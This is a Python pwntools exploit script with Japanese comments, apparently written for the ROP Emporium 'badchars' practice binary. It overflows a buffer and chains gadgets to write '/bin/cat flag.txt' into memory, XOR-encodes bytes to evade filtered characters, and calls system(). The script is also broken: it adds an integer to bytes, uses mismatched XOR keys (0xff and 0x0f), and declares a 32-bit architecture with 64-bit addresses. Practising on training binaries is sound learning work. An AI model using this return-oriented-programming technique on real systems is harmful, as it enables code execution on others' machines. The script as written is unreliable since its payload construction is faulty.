from pwn import *
from subprocess import Popen, PIPE

context(arch = 'i686', os = 'linux')

# pwn
dirname = os.path.dirname(os.path.abspath(__file__))
proc = process(dirname+'/badchars')

#context.terminal = ["bash", "-e"]
context.terminal = ['tmux', 'splitw', '-h']

# デバッガーにアタッチする
if len(sys.argv) > 1 and sys.argv[1] == "debug":
    gdb.attach(proc, '''
        set follow-fork-mode child
        b *0x400b30
        continue
    ''')

buffSize = 40

memset = 0x601030
system_plt = 0x4006f0

#readelfより、書込み可能なメモリアドレス
bss = 0x0000000000601080
data = 0x0000000000601070

#xor    BYTE PTR [r15],r14b
#r14レジスタの下位8bitでxorしてbadchar回避？
usefulGadgets = 0x400b30
#pop r14;pop r15;ret
xor_r15_r14b = 0x400b30
mov_r13_r12 = 0x400b34
pop_rdi = 0x400b39
pop_r12 = 0x400b3b
pop_r13 = 0x400b3d
pop_r14 = 0x400b40
pop_r15 = 0x400b42
"""
  400b30:	45 30 37             	xor    BYTE PTR [r15],r14b
  400b34:	4d 89 65 00          	mov    QWORD PTR [r13+0x0],r12
  400b39:	5f                   	pop    rdi
  400b3b:	41 5c                	pop    r12
  400b3d:	41 5d                	pop    r13
  400b40:	41 5e                	pop    r14
  400b42:	41 5f                	pop    r15
"""

payload = b'A' * buffSize

ngcode = b"bic/ fns"

#メモリにコマンドを書き込み
sh = b"/bin/cat flag.txt"
#padding
sh += b" " * (8 - len(sh) % 8)
for i in range(0,len(sh),8):
    #分割してpopGadgetで書き込み
    #r13,r15(address)
    payload += p64(pop_r13)
    payload += p64(data+i)
    #r12(value)
    payload += p64(pop_r12)
    #下位8bitを0xffでxor
    payload += sh[i:i+7]
    payload += sh[8] ^ 0xff
    print(sh[i:i+8])
    #mov [r13],r12
    payload += p64(mov_r13_r12)
    #pop r15
    payload += p64(pop_r15)
    payload += p64(data+i)
    #pop r14b
    payload += p64(pop_r14)
    payload += p64(0x0000000f)
    #xor [r15],r14b
    payload += p64(xor_r15_r14b)

#pop rdi;
payload += p64(pop_rdi)
payload += p64(data)

#sys_execve
#rdi const char *filename
#rsi const char *const argv[]
#rdx const char *const envp[]
payload += p64(system_plt)

for i in range(0,len(payload),8):
    n = i+7
    if(n > len(payload)):
        n = len(payload)
    print(payload[i:n])

print(len(payload))

proc.sendlineafter(">",payload)

try:
    while True:
        print(proc.recv(100))
except EOFError:
    print('EOF')

proc.wait_for_close()
print(proc.poll())  
